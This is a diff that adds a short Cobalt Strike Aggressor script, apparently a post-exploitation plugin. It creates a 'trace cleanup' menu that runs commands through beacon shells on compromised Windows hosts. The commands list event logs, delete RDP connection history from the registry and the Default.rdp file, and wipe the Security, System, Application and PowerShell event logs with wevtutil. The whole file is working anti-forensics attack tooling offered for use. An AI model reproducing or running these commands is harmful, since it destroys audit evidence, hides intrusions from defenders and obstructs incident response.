@@ -1,0 +1,24 @@
+menu "痕迹清理" {
+    item "日志查询" {
+        local('$bid');
+        foreach $bid($1) {
+            bshell($bid, "wevtutil el&&dir %SystemRoot%\\System32\\Winevt\\Logs");
+        }
+    }
+
+    item "清除3389登陆" {
+        local('$bid');
+        foreach $bid($1) {
+            bshell($bid, "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default /va /f&&del \"%USERPROFILE%\\My Documents\\Default.rdp\" /a");
+        }
+    }
+
+
+    item "清除系统日志" {
+        bshell($1, "wevtutil cl security");
+        bshell($1, "wevtutil cl system");
+        bshell($1, "wevtutil cl application");
+        bshell($1, "wevtutil cl \"windows powershell\"");
+    }
+
+}
